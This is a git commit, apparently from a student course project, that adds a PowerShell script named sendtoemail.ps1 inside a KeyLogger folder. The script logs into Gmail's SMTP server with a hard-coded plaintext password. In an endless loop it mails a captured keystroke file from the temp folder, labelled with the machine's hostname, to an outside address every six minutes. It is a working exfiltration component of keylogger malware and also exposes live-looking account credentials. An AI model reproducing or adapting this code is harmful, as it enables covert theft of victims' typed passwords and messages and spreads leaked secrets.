385a53f6e167da80f6a6b30debc95f65f99b03ab
butlersl <157722385+butlersl@users.noreply.github.com>
2026-04-21 16:29:50 -0400

    Create sendtoemail.ps1

---
+++ KeyLogger/sendtoemail.ps1
@@ -0,0 +1,9 @@
+$SMTPServer = 'smtp.gmail.com'
+$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
+$SMTPInfo.EnableSsl = $true
+$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('cys305finalproject@gmail.com', 'Iwantt0Sw!ng')
+$ReportEmail = New-Object System.Net.Mail.MailMessage
+$ReportEmail.From = 'keyloggingdaddy@gmail.com'
+$ReportEmail.To.Add('keyloggingdaddy@gmail.com')
+$ReportEmail.Subject = 'Keylogger - ' + [System.Net.Dns]::GetHostByName(($env:computerName)).HostName
+while(1){$ReportEmail.Attachments.Add("$ENV:temp\key.txt");$SMTPInfo.Send($ReportEmail);sleep 360} 
